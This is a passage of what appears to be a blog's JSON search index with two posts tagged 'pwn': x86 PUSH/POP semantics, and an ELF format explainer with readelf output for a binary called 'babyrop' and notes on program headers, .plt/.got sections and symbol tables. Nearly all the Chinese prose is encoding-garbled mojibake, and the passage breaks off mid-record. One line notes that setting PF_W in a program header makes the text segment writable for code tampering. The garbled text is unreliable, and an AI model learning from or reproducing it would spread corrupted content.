PUSHæŒ‡ä»¤å’ŒPOPæŒ‡ä»¤å‡ä¸ä¼šå˜æ›´åŸæ¥çš„æ•°æ®ï¼Œè€Œæ˜¯å˜æ›´ç›®çš„åœ°çš„æ•°æ®ã€‚\npush ds:[0]å°±æ˜¯æŠŠæ•°æ®æ®µä¸­ds:[0]å¤„çš„æ•°æ®æ¨å…¥æ ˆä¸­ï¼Œç›¸å½“äºmov ss:sp ds:[0] pop ds:[0]å°±æ˜¯æŠŠæ ˆé¡¶çš„æ•°æ®å¼¹å…¥ds:[0]ä¸­ï¼Œç›¸å½“äºmov ds:[0] ss:sp ","date":"2022å¹´10æœˆ26æ—¥","permalink":"https://peterliuzhi.top/principle/%E6%B1%87%E7%BC%96%E4%B8%8E%E5%AF%84%E5%AD%98%E5%99%A8/","section":"principle","summary":"Kindness is the language which the deaf can hear and the blind can see. â€” Mark Twain æ±‡ç¼–ä¸å¯„å­˜å™¨ å¯„å­˜å™¨ åœ¨16ä½ç³»ç»Ÿä¸­ï¼ˆ8086CPUï¼‰ æ•°æ®å¯„å­˜å™¨ å˜å€å¯„å­˜å™¨ æŒ‡é’ˆå¯„å­˜å™¨ æ®µå¯„å­˜å™¨ æŒ‡é’ˆæŒ‡ä»¤å¯„å­˜å™¨ åœ¨32ä½ç³»ç»Ÿä¸­","tags":["pwn"],"title":"æ±‡ç¼–ä¸å¯„å­˜å™¨"},{"categories":["principle"],"contents":" Myths which are believed in tend to become true. â€” George Orwell\nELFè¯¦è§£ ä»€ä¹ˆæ˜¯ELF ä½¿ç”¨readelfå‘½ä»¤è¯»å–elfæ–‡ä»¶ ELFæ–‡ä»¶ç±»å‹ ELFç¨‹åºå¤´ï¼ˆæè¿°æ®µçš„å¤´ï¼‰ PT_LOAD PT_DYNAMICï¼ˆåŠ¨æ€é“¾æ¥å¯æ‰§è¡Œæ–‡ä»¶ç‰¹æœ‰ï¼‰ PT_NOTE PT_INTERP PT_PHDR ELFèŠ‚å¤´ï¼ˆsection headerï¼‰ æ®µå’ŒèŠ‚çš„åŒºåˆ« èŠ‚å¤´ .textèŠ‚ .rodataèŠ‚ .dataèŠ‚ .bssèŠ‚ .pltèŠ‚ .gotä¸.got.pltèŠ‚ ä¸ºä»€ä¹ˆæœ‰äº†.pltè¿˜è¦æœ‰.gotå‘¢ï¼Ÿ gotè¡¨çš„ç»“æ„ .ctorså’Œ.dtorsèŠ‚ ELFç¬¦å· .symtabèŠ‚ .strtabèŠ‚ .dynsymèŠ‚ .dynstrèŠ‚ .rel.*èŠ‚ .hashèŠ‚ .shstrtabèŠ‚ ELFé‡å®šä½ Relocation åŸºäºäºŒè¿›åˆ¶ä¿®è¡¥çš„é‡å®šä½ä»£ç æ³¨å…¥ ä»€ä¹ˆæ˜¯ELF ELFï¼ˆExecutable and Linkable Formatï¼‰æ˜¯ä¸€ç§ç”¨äºäºŒè¿›åˆ¶æ–‡ä»¶ã€å¯æ‰§è¡Œæ–‡ä»¶ã€ç›®æ ‡ä»£ç ã€å…±äº«åº“å’Œæ ¸å¿ƒè½¬å‚¨æ ¼å¼æ–‡ä»¶çš„æ–‡ä»¶æ ¼å¼ï¼Œç›®å‰å·²ç»æˆä¸ºUnixå’Œç±»Unixæ“ä½œç³»ç»Ÿçš„æ ‡å‡†äºŒè¿›åˆ¶æ ¼å¼ï¼Œç›®å‰å¸¸è§çš„Linuxã€Androidå¯æ‰§è¡Œæ–‡ä»¶ã€å…±äº«åº“ï¼ˆ.soï¼‰ã€ç›®æ ‡æ–‡ä»¶ï¼ˆ .oï¼‰ä»¥åŠCore æ–‡ä»¶å‡ä¸ºæ­¤æ ¼å¼\nä½¿ç”¨readelfå‘½ä»¤è¯»å–elfæ–‡ä»¶ readelf -S æŸ¥è¯¢èŠ‚å¤´è¡¨ -l æŸ¥è¯¢ç¨‹åºå¤´è¡¨ -s æŸ¥è¯¢ç¬¦å·è¡¨ -e æŸ¥è¯¢ELFæ–‡ä»¶å¤´æ•°æ® -r æŸ¥è¯¢é‡å®šä½å…¥å£ -d æŸ¥è¯¢åŠ¨æ€æ®µ ELFæ–‡ä»¶ç±»å‹ ä½¿ç”¨ELFæ ¼å¼çš„æ–‡ä»¶å¯ä»¥è¢«æ ‡è®°ä¸ºä»¥ä¸‹äº”ç§æ ¼å¼ï¼š\næœªçŸ¥ç±»å‹ET_NONE é‡å®šä½æ–‡ä»¶ET_RELï¼Œé€šå¸¸æ˜¯è¿˜æ²¡æœ‰ç»è¿‡é“¾æ¥çš„ä¸€æ®µç‹¬ç«‹ä»£ç ï¼Œä¹Ÿå°±æ˜¯.oæ–‡ä»¶ å¯æ‰§è¡Œæ–‡ä»¶ET_EXECï¼Œè¿™ä¸ªå°±ä¸ç”¨è¯´äº†~ å…±äº«ç›®æ ‡æ–‡ä»¶ET_DYNï¼Œå°±æ˜¯åŠ¨æ€é“¾æ¥åº“ æ ¸å¿ƒæ–‡ä»¶ET_COREï¼Œç¨‹åºå´©æºƒæˆ–äº§ç”ŸSIGSEGVä¿¡å·çš„æ—¶å€™ä¼šåœ¨æ­¤æ–‡ä»¶ä¸­è®°å½•æ•´ä¸ªè¿›ç¨‹çš„é•œåƒä¿¡æ¯ï¼Œä»è€Œè¢«GDBè¯»å–å¤ç›˜ æˆ‘ä»¬å¯ä»¥é€šè¿‡readelf -hå‘½ä»¤æ¥æŸ¥çœ‹åŸå§‹çš„ELFæ–‡ä»¶å¤´ï¼š\n$ readelf -h babyrop ELF å¤´ï¼š Magicï¼š 7f 45 4c 46 02 01 01 00 00 00 00 00 00 00 00 00 ç±»åˆ«: ELF64 æ•°æ®: 2 è¡¥ç ï¼Œå°ç«¯åº (little endian) Version: 1 (current) OS/ABI: UNIX - System V ABI ç‰ˆæœ¬: 0 ç±»å‹: EXEC (å¯æ‰§è¡Œæ–‡ä»¶) ç³»ç»Ÿæ¶æ„: Advanced Micro Devices X86-64 ç‰ˆæœ¬: 0x1 å…¥å£ç‚¹åœ°å€ï¼š 0x4004e0 ç¨‹åºå¤´èµ·ç‚¹ï¼š 64 (bytes into file) Start of section headers: 6768 (bytes into file) æ ‡å¿—ï¼š 0x0 Size of this header: 64 (bytes) Size of program headers: 56 (bytes) Number of program headers: 9 Size of section headers: 64 (bytes) Number of section headers: 31 Section header string table index: 28 readelfæ˜¯æ€ä¹ˆæ‰¾åˆ°ELFå¤´åœ¨å“ªé‡Œå‘¢ï¼Ÿç­”æ¡ˆå°±æ˜¯ELFå¤´ä»äºŒè¿›åˆ¶æ–‡ä»¶çš„0å·åœ°å€ï¼Œä¹Ÿå°±æ˜¯æ–‡ä»¶çš„å¼€å¤´å¼€å§‹ï¼Œå°±å¥½åƒä¸€ç¯‡è®ºæ–‡åœ¨ä¸€å¼€å§‹ä¼šå¯¹æ•´ä¸ªè®ºæ–‡åšæ¦‚è¿°ä¸€æ ·ï¼ŒELFæ–‡ä»¶å¤´æ˜¯å¯¹å‰©ä½™éƒ¨åˆ†çš„ä¸€ä¸ªæ˜ å°„\nELFæ–‡ä»¶å¤´å‘Šè¯‰äº†æˆ‘ä»¬ï¼š\nè¿™ä¸ªæ–‡ä»¶æ˜¯å•¥ç±»å‹çš„æ–‡ä»¶ è¿™ä¸ªæ–‡ä»¶çš„ç»“æ„ ç¨‹åºå¼€å§‹æ‰§è¡Œçš„å…¥å£åœ°å€ å…¶ä»–ELFå¤´ï¼ˆèŠ‚å¤´ã€ç¨‹åºå¤´ï¼‰çš„åœ°å€ï¼ˆåç§»é‡ï¼‰ ELFç¨‹åºå¤´ï¼ˆæè¿°æ®µçš„å¤´ï¼‰ åœ¨åŸå§‹çš„ELFå¤´ä¸­æˆ‘ä»¬è®°å½•äº†ELFç¨‹åºå¤´çš„åœ°å€ï¼ˆe_phoffï¼‰ï¼Œè¿™æ ·æˆ‘ä»¬å°±èƒ½å¾—åˆ°ç¨‹åºå¤´è¡¨\nELFç¨‹åºå¤´æ˜¯å¯¹äºŒè¿›åˆ¶æ–‡ä»¶ä¸­æ®µçš„æè¿°ï¼Œæ˜¯ç¨‹åºå¿…éœ€çš„ä¸€éƒ¨åˆ†ã€‚\næˆ‘ä»¬çŸ¥é“ï¼Œä¸€ä¸ªç¨‹åºæƒ³è¦è¿è¡Œï¼Œé¦–å…ˆè¦æŠŠå®ƒè£…è½½åˆ°å†…å­˜ä¸Šï¼Œè€Œè¿™ä¸ªELFç¨‹åºå¤´å°±ç›¸å½“äºä¸€æœ¬ç¨‹åºè£…è½½çš„è¯´æ˜ä¹¦ï¼Œå‘Šè¯‰ä½ æ¯ä¸ªæ®µæ˜¯æ€æ ·çš„ã€‚\næˆ‘ä»¬å¯ä»¥é€šè¿‡readelf -læ¥æŸ¥è¯¢ç¨‹åºå¤´è¡¨ï¼š\n$ readelf -l babyrop Elf æ–‡ä»¶ç±»å‹ä¸º EXEC (å¯æ‰§è¡Œæ–‡ä»¶) Entry point 0x4004e0 There are 9 program headers, starting at offset 64 ç¨‹åºå¤´ï¼š Type Offset VirtAddr PhysAddr FileSiz MemSiz Flags Align PHDR 0x0000000000000040 0x0000000000400040 0x0000000000400040 0x00000000000001f8 0x00000000000001f8 R E 0x8 INTERP 0x0000000000000238 0x0000000000400238 0x0000000000400238 0x000000000000001c 0x000000000000001c R 0x1 [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2] LOAD 0x0000000000000000 0x0000000000400000 0x0000000000400000 0x0000000000000814 0x0000000000000814 R E 0x200000 LOAD 0x0000000000000e10 0x0000000000600e10 0x0000000000600e10 0x0000000000000240 0x0000000000000248 RW 0x200000 DYNAMIC 0x0000000000000e28 0x0000000000600e28 0x0000000000600e28 0x00000000000001d0 0x00000000000001d0 RW 0x8 NOTE 0x0000000000000254 0x0000000000400254 0x0000000000400254 0x0000000000000044 0x0000000000000044 R 0x4 GNU_EH_FRAME 0x00000000000006e8 0x00000000004006e8 0x00000000004006e8 0x0000000000000034 0x0000000000000034 R 0x4 GNU_STACK 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 0x0000000000000000 RW 0x10 GNU_RELRO 0x0000000000000e10 0x0000000000600e10 0x0000000000600e10 0x00000000000001f0 0x00000000000001f0 R 0x1 Section to Segment mapping: æ®µèŠ‚... 00 01 .interp 02 .interp .note.ABI-tag .note.gnu.build-id .gnu.hash .dynsym .dynstr .gnu.version .gnu.version_r .rela.dyn .rela.plt .init .plt .plt.got .text .fini .rodata .eh_frame_hdr .eh_frame 03 .init_array .fini_array .jcr .dynamic .got .got.plt .data .bss 04 .dynamic 05 .note.ABI-tag .note.gnu.build-id 06 .eh_frame_hdr 07 08 .init_array .fini_array .jcr .dynamic .got ELFç¨‹åºå¤´æœ‰ä¸€äº›å¸¸è§çš„ç±»å‹ï¼Œä¸‹é¢æˆ‘ä»¬æ¥ä»‹ç»ä¸€ä¸‹å®ƒä»¬\nPT_LOAD è¿™ç±»ç¨‹åºå¤´æè¿°çš„æ˜¯å¯ä»¥è¢«è£…è½½çš„æ®µï¼Œæ ¹æ®è¿™ä¸ªå¤´ï¼Œæˆ‘ä»¬å°†éœ€è¦çš„æ®µè£…è½½/æ˜ å°„åˆ°å†…å­˜ä¸­\nä¸€ä¸ªåŠ¨æ€é“¾æ¥çš„ELFå¯æ‰§è¡Œæ–‡ä»¶é€šå¸¸åŒ…æ‹¬ï¼š\ntextæ®µï¼šå­˜æ”¾ç¨‹åºä»£ç ï¼ˆé€šå¸¸å¯è¯»å¯æ‰§è¡ŒPF_R|PF_Xï¼‰ dataæ®µï¼šå…¨å±€å˜é‡å’ŒåŠ¨æ€é“¾æ¥ä¿¡æ¯ï¼ˆé€šå¸¸å¯è¯»å¯å†™PF_R|PF_Wï¼‰ æˆ‘ä»¬å¯ä»¥æ›´æ”¹ç¨‹åºå¤´ä¸­p_flagså¤„å¢åŠ PF_Wæ ‡è®°æ¥ä¿®æ”¹textæ®µæƒé™ï¼Œä»è€Œæ‰­æ›²åŸæœ¬çš„ä»£ç \nPT_DYNAMICï¼ˆåŠ¨æ€é“¾æ¥å¯æ‰§è¡Œæ–‡ä»¶ç‰¹æœ‰ï¼‰ å®ƒåŒ…æ‹¬äº†ï¼š\nåŠ¨æ€é“¾æ¥çš„åº“åˆ—è¡¨ DT_NEEDEDï¼šå…±äº«åº“åçš„å­—ç¬¦ä¸²è¡¨çš„åç§»é‡ GOTè¡¨çš„åœ°å€ DT_PLTGOTï¼šå…¨å±€åç§»è¡¨ï¼ˆGOTï¼‰çš„åœ°å€ é‡å®šä½æ¡ç›®çš„ç›¸å…³ä¿¡æ¯ DT_SYMTABï¼šåŠ¨æ€ç¬¦å·è¡¨çš„åœ°å€ï¼Œå¯¹åº”.dynsymèŠ‚ DT_HASHï¼šç¬¦å·æ•£åˆ—è¡¨çš„åœ°å€ï¼Œå¯¹åº”.hashèŠ‚ DT_STRTABï¼šç¬¦å·å­—ç¬¦ä¸²è¡¨çš„åœ°å€ï¼Œå¯¹åº”.dynstrèŠ‚ \u0026hellip; PT_NOTE ç‰¹å®šä¾›åº”å•†/ç³»ç»Ÿç›¸å…³çš„é™„åŠ ä¿¡æ¯\nå®é™…ä¸Šè¿™ä¸€æ®µåªä¿å­˜äº†æ“ä½œç³»ç»Ÿçš„è§„èŒƒä¿¡æ¯ï¼Œåœ¨è¿è¡Œçš„æ—¶å€™æ˜¯ä¸éœ€è¦å®ƒçš„\nè¿˜æœ‰ä¸€ç§noteæ®µçš„æ”»å‡»ï¼Œä½†ä½œè€…å®åœ¨æ˜¯æ²¡æ‰¾åˆ°ç›¸å…³èµ„æ–™ï¼Œå¦‚æœå„ä½è¯»è€…æœ‰ç›¸å…³èµ„æ–™å¯ä»¥å‚è€ƒï¼Œçƒ¦è¯·åœ¨è¯„è®ºåŒºç»™å‡ºé“¾æ¥ï¼Œæ„Ÿè°¢æ‚¨çš„ä»˜å‡ºï¼\nPT_INTERP å¯¹ç¨‹åºè§£é‡Šå™¨ä½ç½®çš„æè¿°ï¼Œå¦‚ï¼Œ/lib/linux-ld.so.2ä¸€èˆ¬æŒ‡åŠ¨æ€è¿æ¥å™¨çš„ä½ç½®ï¼Œä¹Ÿå³ç¨‹åºè§£é‡Šå™¨çš„ä½ç½®ï¼ˆ.so.2æ–‡ä»¶ä¸æ˜¯.soæ–‡ä»¶ï¼‰\nPT_PHDR ä¿å­˜äº†ç¨‹åºå¤´è¡¨æœ¬èº«çš„ä½ç½®å’Œå¤§å°ï¼Œphdrä¸ºprogram headerçš„ç¼©å†™\nELFèŠ‚å¤´ï¼ˆsection headerï¼‰ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨readelf -Så‘½ä»¤æŸ¥çœ‹èŠ‚å¤´è¡¨ï¼š\n$ readelf -S babyrop There are 31 section headers, starting at offset 0x1a70: èŠ‚å¤´ï¼š [å·] åç§° ç±»å‹ åœ°å€ åç§»é‡ å¤§å° å…¨ä½“å¤§å° æ——æ ‡ é“¾æ¥ ä¿¡æ¯ å¯¹é½ [ 0] NULL 0000000000000000 00000000 0000000000000000 0000000000000000 0 0 0 [ 1] .interp PROGBITS 0000000000400238 00000238 000000000000001c 0000000000000000 A 0 0 1 [ 2] .note.ABI-tag NOTE 0000000000400254 00000254 0000000000000020 0000000000000000 A 0 0 4 [ 3] .note.gnu.bu[...] NOTE 0000000000400274 00000274 0000000000000024 0000000000000000 A 0 0 4 [ 4] .gnu.hash GNU_HASH 0000000000400298 00000298 000000000000001c 0000000000000000 A 5 0 8 [ 5] .dynsym DYNSYM 00000000004002b8 000002b8 0000000000000090 0000000000000018 A 6 1 8 [ 6] .dynstr STRTAB 0000000000400348 00000348 000000000000005f 0000000000000000 A 0 0 1 [ 7] .gnu.version VERSYM 00000000004003a8 000003a8 000000000000000c 0000000000000002 A 5 0 2 [ 8] .gnu.version_r VERNEED 00000000004003b8 000003b8 0000000000000030 0000000000000000 A 6 1 8 [ 9] .rela.dyn RELA 00000000004003e8 000003e8 0000000000000018 0000000000000018 A 5 0 8 [10] .rela.plt RELA 0000000000400400 00000400 0000000000000060 0000000000000018 AI 5 24 8 [11] .init PROGBITS 0000000000400460 00000460 000000000000001a 0000000000000000 AX 0 0 4 [12] .plt PROGBITS 0000000000400480 00000480 0000000000000050 0000000000000010 AX 0 0 16 [13] .plt.got PROGBITS 00000000004004d0 000004d0 0000000000000008 0000000000000000 AX 0 0 8 [14] .text PROGBITS 00000000004004e0 000004e0 00000000000001b2 0000000000000000 AX 0 0 16 [15] .fini PROGBITS 0000000000400694 00000694 0000000000000009 0000000000000000 AX 0 0 4 [16] .rodata PROGBITS 00000000004006a0 000006a0 0000000000000047 0000000000000000 A 0 0 8 [17] .eh_frame_hdr PROGBITS 00000000004006e8 000006e8 0000000000000034 0000000000000000 A 0 0 4 [18] .eh_frame PROGBITS 0000000000400720 00000720 00000000000000f4 0000000000000000 A 0 0 8 [19] .init_array INIT_ARRAY 0000000000600e10 00000e10 0000000000000008 0000000000000000 WA 0 0 8 [20] .fini_array FINI_ARRAY 0000000000600e18 00000e18 0000000000000008 0000000000000000 WA 0 0 8 [21] .jcr PROGBITS 0000000000600e20 00000e20 0000000000000008 0000000000000000 WA 0 0 8 [22] .dynamic DYNAMIC 0000000000600e28 00000e28 00000000000001d0 0000000000000010 WA 6 0 8 [23] .got PROGBITS 0000000000600ff8 00000ff8 0000000000000008 0000000000000008 WA 0 0 8 [24] .got.plt PROGBITS 0000000000601000 00001000 0000000000000038 0000000000000008 WA 0 0 8 [25] .data PROGBITS 0000000000601038 00001038 0000000000000018 0000000000000000 WA 0 0 8 [26] .bss NOBITS 0000000000601050 00001050 0000000000000008 0000000000000000 WA 0 0 1 [27] .comment PROGBITS 0000000000000000 00001050 0000000000000035 0000000000000001 MS 0 0 1 [28] .shstrtab STRTAB 0000000000000000 00001964 000000000000010c 0000000000000000 0 0 1 [29] .symtab SYMTAB 0000000000000000 00001088 0000000000000690 0000000000000018 30 47 8 [30] .strtab STRTAB 0000000000000000 00001718 000000000000024c 0000000000000000 0 0 1 Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings), I (info), L (link order), O (extra OS processing required), G (group), T (TLS), C (compressed), x (unknown), o (OS specific), E (exclude), D (mbind), l (large), p (processor specific) è¿™é‡Œé¢æˆ‘ä»¬å¯ä»¥æ³¨æ„ä¸€ä¸‹æ¯ä¸ªèŠ‚çš„æ——æ ‡ï¼ˆflagï¼‰ï¼Œå¦‚æœè¢«æ ‡è®°ä¸ºAï¼Œé‚£ä¹ˆè¯´æ˜è¯¥èŠ‚ä¼šåœ¨ç¨‹åºè¿è¡Œæ—¶åˆ†é…å¹¶è£…è½½è¿›å†…å­˜ã€‚æœ‰ä¸€äº›èŠ‚åœ¨è¿è¡Œæ—¶ä¸æ˜¯å¿…éœ€çš„ï¼Œå°±ä¸ä¼šè¢«è£…è½½ã€‚æ¯”å¦‚.symtabèŠ‚ï¼Œæœ‰æ—¶å€™ä¸ºäº†èŠ‚çœç©ºé—´ä¼šæŠŠå®ƒåˆ æ‰\næ®µå’ŒèŠ‚çš„åŒºåˆ« æ®µæ˜¯ç¨‹åºæ‰§è¡Œçš„å¿…è¦ç»„æˆéƒ¨åˆ† èŠ‚æ˜¯æ®µä¸­ä»£ç æˆ–æ•°æ®çš„åˆ’åˆ† æ®µæ˜¯æˆ¿å­çš„æˆ¿é—´ï¼ŒèŠ‚æ˜¯æˆ¿é—´ä¸­çš„å±é£éš”æ–­\nè€Œæ‰€è°“èŠ‚å¤´è¡¨å°±æ˜¯å¯¹è¿™äº›èŠ‚çš„ä½ç½®å’Œå¤§å°çš„æè¿°ï¼ˆä¸»è¦ç”¨äºé“¾æ¥å’Œè°ƒè¯•ï¼Œæ²¡æœ‰å®ƒç¨‹åºå¯ä»¥æ­£å¸¸è¿è¡Œï¼‰\nèŠ‚å¤´ å¦‚æœç¨‹åºä¸­ç¼ºå°‘äº†èŠ‚å¤´ï¼Œå¹¶ä¸æ„å‘³ç€èŠ‚æ¶ˆå¤±äº†ï¼›å°±å¥½åƒç”µè¯ç°¿ä¸ŠæŸäººçš„å·ç æ¶ˆå¤±äº†ï¼Œå¹¶ä¸ä»£è¡¨æŸäººçš„å·ç ä¸å­˜åœ¨äº†ã€‚æˆ‘ä»¬åªæ˜¯ä¸èƒ½å†é€šè¿‡èŠ‚å¤´å¼•ç”¨èŠ‚äº†è€Œå·² å› æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥äººä¸ºåœ°åˆ é™¤èŠ‚å¤´ï¼Œç¨‹åºä»ç„¶å¯ä»¥æ­£å¸¸è¿è¡Œ ä½†æ˜¯å¦‚æœæ²¡æœ‰èŠ‚å¤´ï¼Œgdbå’Œobjdumpè¿™ç§å·¥å…·å°±æ²¡ç”¨äº†\n.textèŠ‚ ä¿å­˜äº†ç¨‹åºä»£ç æŒ‡ä»¤ï¼Œä¸€èˆ¬å­˜åœ¨textæ®µä¸­\n.rodataèŠ‚ rodataä¸ºread-only dataçš„ç¼©å†™ï¼Œæ„ä¸ºåªè¯»æ•°æ®ï¼Œè¿™ä¸ªèŠ‚å› ä¸ºæ•°æ®åªè¯»ï¼Œå› æ­¤ä¸å­˜åœ¨dataæ®µä¸­ï¼Œè€Œæ˜¯åœ¨textæ®µä¸­\n.dataèŠ‚ .dataèŠ‚ä¿å­˜äº†åˆå§‹åŒ–çš„å…¨å±€å˜é‡ç­‰æ•°æ®ï¼Œå­˜åœ¨dataæ®µä¸­\n.bssèŠ‚ .bssèŠ‚ä¸­ä¿å­˜äº†\næœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ åœ¨ä»£ç ä¸­æ²¡æœ‰æ˜ç¡®åˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œé™æ€å˜é‡ å®ƒå­˜åœ¨dataæ®µä¸­ï¼Œä¸€èˆ¬æ¥è¯´å®ƒä¼šè¢«åˆå§‹åŒ–ä¸º0ï¼Œä½†æ˜¯åœ¨è¿è¡ŒæœŸé—´å®ƒçš„å€¼æ˜¯å¯èƒ½æ”¹å˜çš„\nå®ƒä¸ºä»€ä¹ˆè¢«ç§°ä¸ºbsså‘¢ï¼Ÿè¯·çœ‹ä¸‹å›¾ï¼š\nbssåŸæœ¬æ˜¯æŒ‡ block storage start å—çŠ¶å­˜å‚¨èµ·ç‚¹ï¼ˆæ¸£ç¿»è¯·å‹¿åœ¨æ„ï¼‰ï¼ˆæˆ–è€…block started by symbolï¼‰ï¼Œä½†æ˜¯ä¸ºäº†å’Œ.dataèŠ‚åŒºåˆ†ï¼Œå¯ä»¥è®°ä½œ better save space æ›´ä¼˜ä¿å­˜ç©ºé—´\nå¯ä»¥å‚è€ƒè¿™ç¯‡åšæ–‡\n.pltèŠ‚ pltè¡¨ï¼Œæ„ä¸ºprocedure linkage table è¿‡ç¨‹é“¾æ¥è¡¨ï¼ŒåŒ…å«äº†åŠ¨æ€é“¾æ¥å™¨è°ƒç”¨ä»å…±äº«åº“å¯¼å…¥çš„å‡½æ•°æ‰€å¿…éœ€çš„ç›¸å…³ä»£ç ï¼Œä¿å­˜åœ¨textæ®µä¸­\n.gotä¸.got.pltèŠ‚ gotæ„ä¸ºGlobal Offsets Tableï¼Œä¿å­˜äº†å…¨å±€åç§»è¡¨ï¼Œä¿å­˜åœ¨textæ®µä¸­ï¼Œå’Œ.pltèŠ‚ä¸€èµ·æä¾›äº†å¯¹å¯¼å…¥çš„å…±äº«åº“å‡½æ•°çš„è®¿é—®å…¥å£ï¼Œç”±åŠ¨æ€é“¾æ¥å™¨åœ¨è¿è¡Œæ—¶è¿›è¡Œä¿®æ”¹ã€‚\n.gotå’Œ.pltçš„å…³ç³»ç±»ä¼¼äºï¼š\n.gotä¸­å­˜å‚¨çš„æ˜¯ä¸€å—ç©ºé—´çš„åœ°å€ï¼Œè¿™å—ç©ºé—´ä¸­ä¸€å¼€å§‹ä¿å­˜äº†ä¸€ä¸ªoffsetç”¨äºä¸.pltä¸­çš„åœ°å€è¿›è¡Œè®¡ç®—å¾—åˆ°çœŸå®åœ°å€ï¼Œç„¶åå°±ä¼šæŠŠè¿™ä¸ªçœŸå®åœ°å€å­˜å…¥.gotæŒ‡å‘çš„é‚£å—ç©ºé—´ä¹‹ä¸­\nGot.plt is actually smaller subset of the .got section. Think of pointing to the tail end of an array of slots. Conceptually it sort of looks like this\nint[10] got; int* gotplt = \u0026amp;got[5]; è€Œ.got.pltèŠ‚æ˜¯.gotçš„ä¸€ä¸ªå­é›†ï¼Œ\nGot section basically can contain addresses of Global variables and functions. All the global variables are in the first couple of slots and suffix is all pointers to functions. gotplt is the first slot .got that contains only the addresses of function.\n.gotè¡¨ä¸­åŒ…å«äº†å…¨å±€å˜é‡å’Œå‡½æ•°çš„åœ°å€ï¼Œä½†.got.pltä¸­åªæœ‰å‡½æ•°\nEventually after function addresses are resolved via means of plt. The resolved address goes into .gotplt which btw is inside .got as I mentioned earlier.\næœ€ç»ˆç”±äº.pltè¡¨çš„å­˜åœ¨ï¼Œè¿è¡Œçš„æ—¶å€™.got.pltä¸­çš„åœ°å€ä¼šè¢«è½¬åŒ–ï¼Œè€Œè¿™ä¸ª.got.pltä»ç„¶åœ¨.gotä¸­\næ›´å¤šè¯·æŸ¥çœ‹æ­¤é—®é¢˜\nä¸ºä»€ä¹ˆæœ‰äº†.pltè¿˜è¦æœ‰.gotå‘¢ï¼Ÿ å› ä¸ºå•çº¯ç”±pltè¡¨æ²¡æ³•æ‰¾åˆ°å‡½æ•°çš„çœŸå®åœ°å€ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡gotè¡¨æ‰èƒ½çœŸæ­£åœ°è°ƒç”¨å‡½æ•°ã€‚\næ—¢ç„¶å¦‚æ­¤ï¼Œä¸ºä»€ä¹ˆä¸ä¸€å¼€å§‹å°±ä¿å­˜å‡½æ•°çš„çœŸå®åœ°å€å‘¢ï¼Ÿ\nå› ä¸ºåŠ¨æ€é“¾æ¥å™¨é‡‡ç”¨é»˜è®¤çš„å»¶è¿Ÿé“¾æ¥æ–¹å¼æ—¶ï¼Œä¸ä¼šåœ¨ç¬¬ä¸€æ¬¡è°ƒç”¨æ—¶å°±å¯¹åœ°å€è¿›è¡Œè§£æï¼Œè¿™æ ·å¯ä»¥æé«˜è£…è½½æ—¶çš„æ€§èƒ½\ngotè¡¨çš„ç»“æ„ .ctorså’Œ.dtorsèŠ‚ ctors -\u0026gt; Constructor æ„é€ å™¨ï¼Œæ˜¯åœ¨mainå‡½æ•°ä¹‹å‰éœ€è¦æ‰§è¡Œçš„å‡½æ•° dtors -\u0026gt; Destructor ææ„å™¨ï¼Œæ˜¯åœ¨mainå‡½æ•°ä¹‹åéœ€è¦æ‰§è¡Œçš„å‡½æ•° å®ƒä»¬ä¿å­˜äº†æ„é€ å‡½æ•°å’Œææ„å‡½æ•°çš„æŒ‡é’ˆ\nELFç¬¦å· ç¬¦å·æ˜¯å¯¹æŸäº›ç±»å‹çš„æ•°æ®æˆ–è€…ä»£ç çš„ç¬¦å·å¼•ç”¨ï¼Œå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªç»“æ„ä½“ï¼Œå¯ä»¥ç”¨äºé“¾æ¥ã€é‡å®šä½ã€åæ±‡ç¼–å’Œè°ƒè¯•\ntypedef struct elf64_sym { Elf64_Word st_name; /* ç¬¦å·åç§°ï¼Œå­—ç¬¦ä¸²è¡¨ä¸­çš„ç´¢å¼• STT_OBJECT è¡¨ç¤ºç¬¦å·å…³è”åˆ°ä¸€ä¸ªæ•°æ®å¯¹è±¡ï¼Œå¦‚å˜é‡ã€æ•°ç»„æˆ–æŒ‡é’ˆï¼› STT_FUNC è¡¨ç¤ºç¬¦å·å…³è”åˆ°ä¸€ä¸ªå‡½æ•°ï¼› STT_SECTION è¡¨ç¤ºç¬¦å·å…³è”åˆ°èŠ‚ STT_NOTYPE è¡¨ç¤ºç¬¦å·ç±»å‹æœªæŒ‡å®šï¼Œç”¨äºæœªå®šä¹‰å¼•ç”¨ */ unsigned char st_info; /* ç±»å‹å’Œç»‘å®šå±æ€§ï¼š STB_LOCAL æœ¬åœ°ç¬¦å·åœ¨ç›®æ ‡æ–‡ä»¶ä¹‹å¤–æ—¶ä¸å¯è§çš„ STB_GLOBAL å¯¹äºæ‰€æœ‰è¦åˆå¹¶çš„ç›®æ ‡æ–‡ä»¶éƒ½å¯è§ STB_WEAK ç±»ä¼¼äºSTB_GLOBALï¼Œä¸è¿‡ä¼˜å…ˆçº§è¾ƒå¼±ï¼Œå¯èƒ½ä¼šè¢«ä¸ºæ ‡è®°ä¸ºSTB_WEAKçš„åŒåç¬¦å·è¦†ç›– */ unsigned char st_other; // è¯­ä¹‰æœªå®šä¹‰ï¼Œ0 Elf64_Half st_shndx; // ç›¸å…³èŠ‚çš„ç´¢å¼•ï¼Œç¬¦å·å°†ç»‘å®šåˆ°è¯¥èŠ‚ï¼Œæ­¤å¤–SHN_ABSæŒ‡å®šç¬¦å·æ˜¯ç»å¯¹å€¼ï¼Œä¸å› é‡å®šä½è€Œæ”¹å˜ï¼ŒSHN_UNDEFæ ‡è¯†æœªå®šä¹‰ç¬¦å·ã€‚ Elf64_Addr st_value; // ç¬¦å·çš„å€¼ Elf64_Xword st_size; // ç¬¦å·çš„é•¿åº¦ï¼Œå¦‚ä¸€ä¸ªæŒ‡é’ˆçš„é•¿åº¦æˆ–structå¯¹è±¡ä¸­åŒ…å«çš„å­—èŠ‚æ•°ã€‚ }Elf64_Sym; æˆ‘ä»¬å¯ä»¥ä½¿ç”¨readelf -så‘½ä»¤æŸ¥çœ‹ç¨‹åºç¬¦å·è¡¨ï¼š\n$ readelf -s babyrop Symbol table \u0026#39;.dynsym\u0026#39; contains 6 